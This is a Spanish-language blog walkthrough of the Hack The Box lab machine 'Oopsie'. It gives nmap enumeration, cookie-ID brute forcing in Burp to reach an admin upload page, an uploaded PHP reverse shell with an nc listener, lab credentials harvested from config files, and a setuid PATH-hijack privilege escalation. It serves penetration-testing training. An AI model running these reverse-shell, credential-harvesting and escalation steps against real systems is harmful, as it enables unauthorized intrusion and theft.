---
Title: Hack-The-Box (0003) > Starting Point > Oopsie
Date: 2021-03-19
Modified: 2021-03-19
Tags: blog, penserbjorne, htb, pentest, hacking, oopsie
Keywords: blog, penserbjorne, htb, pentest, hacking, oopsie
Category: htb
Author: penserbjorne
Summary: Anotaciones sobre la máquina "Oopsie" de la sección "Starting point" de Hack-The-Box
Lang: es-MX
Translation: false
Status: draft
---

# Oopsie

Bueno, esta es la segunda entrada de la serie de anotaciones sobre la sección
*Starting point* de `HTB`. En esta ocasión trabajaremos con la máquina
*Oopsie*. Si no sabes bien de que hablo te recomiendo que primero leas la
[entrada que inaugura esta serie]({filename}./htb-01-starting-point-section.md).

**Nota:** Para fines didácticos (en realidad no quiero reescribir todo) este
texto y el resto de la serie estarán basados en la entrada previa, en este caso
en la entrada de [Archetype]({filename}./04-htb-02-starting-point-archetype.md).

- **Máquina:** Oopsie
- **SO:** Linux
- **IP:** 10.10.10.28

## Enumeration

Como siempre digo: "*primero lo primero*", pues vamos a comenzar a **enumerar**
lo que tiene el equipo objetivo, en este caso vamos a tratar de identificar
los puertos abiertos y el software asociado a estos.

Para esto utilizaremos la siempre poderosa herramienta de
[Nmap](https://es.wikipedia.org/wiki/Nmap).

Lo primero que nos recomiendan utilizar es el siguiente comandos:

```bash
nmap -sS -A 10.10.10.28
```

Del comando anterior podemos observar los siguientes parámetros:

-	`-sS`: Estamos indicando un escaneo `TCP SYN (Stealth) Scan`, el cual es el
más común ya que es relativamente discreto y sigiloso debido a que nunca
completa las conexiones TCP. Requiere permisos de `root`.
-	`-A`: Permite indicar un escaneo agresivo, es un alias para
`-O -sV -sC --traceroute`. En resumen habilita detección del SO, detección de
versiones de software, escaneo de scripts, y traceroute de la conexión.
-	`10.10.10.28`: Indicamos la dirección del objetivo a escanear.


La salida del comando anterior es la siguiente.

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-19 17:46 EDT
Nmap scan report for 10.10.10.28
Host is up (0.069s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/19%OT=22%CT=1%CU=44601%PV=Y%DS=2%DC=T%G=Y%TM=60551BC
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   70.58 ms 10.10.14.1
2   70.88 ms 10.10.10.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.47 seconds
```

Cómo podemos observar se encuentran abiertos dos puertos con sus respectivos
servicios, el puerto 22 para `SSH` y el puerto 80 para un servidor web `Apache`.

Dado que hay un servidor web podemos ingresar por el navegador a la IP
correspondiente.

Ingresando podemos ver un sitio web de `MegaCorp Automotive`. Revisando el sitio
podemos observar que hacen referencia a un *inicio de sesión*.

-	Podemos revisar código fuente del sitio, veremos el script en el directorio folder
-	Burpsuite
	-	Configuramos firefox para que apunte a 127.0.0.1:8080
	-	Refrescamos sitio
	-	Verificamos que "Intercept is off" en "Proxy"
	-	Encotramos el enlace de login de nuevo :v

-	Ingresamos al login
	-	Intentamos credenciales "admin" y "MEGACORP_4dm1n!!" de la maquina anterior
	-	Ingresamos al portal
	-	Revisamos el portal y vemos que la sección "Uploads" esta bloqueada

-	Buscamos acceso a "Upload"
	-	Vemos que en la sección "Accounts" que se despliegan datos de las credenciales
	-	Vamos a revisar las peticiones con Burpsuite
	-	Activamos la opción "Intercept is on" en "Proxy"
	-	Revisamos la cookie y vemos que hay un "user" id y un "role"

-	Hacemos brute force a los valores del ID para encontrar otros roles
	-	En la sección Intruder
		-	En la sección Positions
			-	Limpiamos las variables y solo indicamos que será el 1
		-	En la sección payloads
			-	Generamos el script para numeros
			-	Pegamos los numetos en las opciones del payload
		-	Sección options
			-	Sección redirections
				-	Habilitamos "Follow redirections" to "Always"
				-	Habilitamos "Process cookies in redirections"
		-	Sección Target
			-	Comenzamos ataque
			-	Vemos los resultados, observamos que hay un cambio en el tampo de las respuestas
			-	Analizamos los que sean de tamaño distinto hasta encontrar al super admin
			-	Vemos que la respuesta corresponde al request id=30 y el id user=86575 es el del super admin
			-	Con "Intercetp" activamos vamos a Uploads y ponemos el user del super admin


## Foothold

-	Probablemente no hay input validation
-	Subimos una reverse shell
	-	https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
	-	"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md"
	-	https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
		-	curl -O https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
	-	Obtengo mi IP y modifico la shell con la IP y el puerto (tun)
	-	Subo la shell

-	Utilizamos dirserch para escanear las carpetas
	-	https://github.com/maurosoria/dirsearch
		-	git clone https://github.com/maurosoria/dirsearch.git
		-	cd dirsearch
		-	python3 dirsearch.py -u http://10.10.10.28 -e php
			-	Indicamos el objetivo
			-	Indicamos las extensiones de archivo a dar prioridad
	-	Encontramos el folder uploads
	-	configuramos firewall
		-	ufw allow from 10.10.10.27 proto tcp to any port 80,443
	-	Preparamos netcat
		-	rlwrap nc -lvnp 443
			-	`l`: modo de escucha, para conexiones entrantes
			-	`v`: modo `verbose`, para ir viendo que sucede
			-	`n`: para trabajar con direcciones IP
			-	`p`:
	-	Activamos la shell
		-	curl http://10.10.10.28/uploads/test.php
	-	Obtenemos una shell interactiva
		-	SHELL=/bin/bash script -q /dev/null
		-	Ctrl-Z
		-	stty raw -echo
		-	fg
		-	reset
		-	xterm

##	Lateral movement

-	Analizamos el sitio para ver si encontramos algo interante en los archivos
php del login
	-	cd /var/www/html/cdn-cgi/login
	-	notamos el archivo db.php, lo revisamos
	-	Encontramos accesos a mysql
		-	$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
	-	Cambiamos al usuario robert
	-	Sacamos la flag

##	Privilege Escalation

-	Buscamos que onda con robert
	-	id robert, para verificar sus grupos
	-	encontramos el grupo bugtracker

-	Buscamos archivos relacionados al grupo bugtracker
	-	https://askubuntu.com/questions/350208/what-does-2-dev-null-mean
	-	Encontramos un binario
	- listamos el binario para ver sus permisos
	-	Vemos que tiene el setuid asignado (por la s)
		-	Permite ejecutar el binaro como si fuera root para cualquier usuario
	-	Ejecutamos el binario para ver que hace
	-	Analizamos sus cadenas internas con strings
		-	Vemos que manda a llamar a `cat`
		-	Podemos crear un `cat` malvado que sea suplantado
			```
			export PATH=/tmp:$PATH
			cd /tmp/
			echo '/bin/sh' > cat
			chmod +x cat
			```
	-	Ejecutamos bugtracker para obtener una nueva shell con permisos de root
	-	vamos al directorio root y extraemos la flag

-	Continuamos revisando por chismoso, folder .config, veremos un archivo de filezilla con credenciales

```
<User>ftpuser</User>
<Pass>mc@F1l3ZilL4</Pass>
```


## Fin

Bueno, con eso hemos concluido la revisión del primer walk-through de las
máquinas de introducción de `HTB`. Este texto fue un poco más extenso ya que se
fueron expllicando paso a paso cada comando, pero conforme avancemos en las
herramientas y comandos obviaremos los que se hayan explicado previamente.

Espero haya sido de tu agrado y utilidad este texto, y si vas comenzando en
estos temas de seguridad, [recuerda no rendirte](https://www.youtube.com/watch?v=dQw4w9WgXcQ)
y seguir aprendiendo poco a poco.

Nos vemos en el siguiente texto. Ciao!

`#HappyHacking`
